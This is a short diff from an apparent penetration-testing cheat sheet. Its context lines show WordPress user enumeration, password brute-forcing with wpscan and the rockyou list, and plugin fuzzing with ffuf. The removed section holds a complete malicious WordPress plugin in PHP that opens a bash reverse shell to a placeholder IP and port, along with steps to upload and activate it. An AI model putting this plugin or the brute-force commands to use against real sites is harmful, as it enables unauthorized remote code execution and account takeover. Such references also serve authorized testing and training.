@@ -427,27 +427,6 @@ wpscan --url <<URL>> -U users.txt -P /usr/share/wordlists/rockyou.txt
 ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt -u <<URL>> -ic
 ```
 
-#### Wordpress Plugin RCE
-
-Zip up this php file then upload and activate plugin. Wait for reverse shell. 
-
-```
-<?php
-
-/**
-* Plugin Name: Reverse Shell Plugin
-* Plugin URI:
-* Description: Reverse Shell Plugin
-* Version: 1.0
-* Author: Vince Matteo
-* Author URI: http://www.sevenlayers.com
-*/
-
-exec("/bin/bash -c 'bash -i >& /dev/tcp/<<IP>>/<<PORT>> 0>&1'");
-?>
-```
-
-
 ## Port 111 (RPCBIND)
 
 ### Searching for NFS
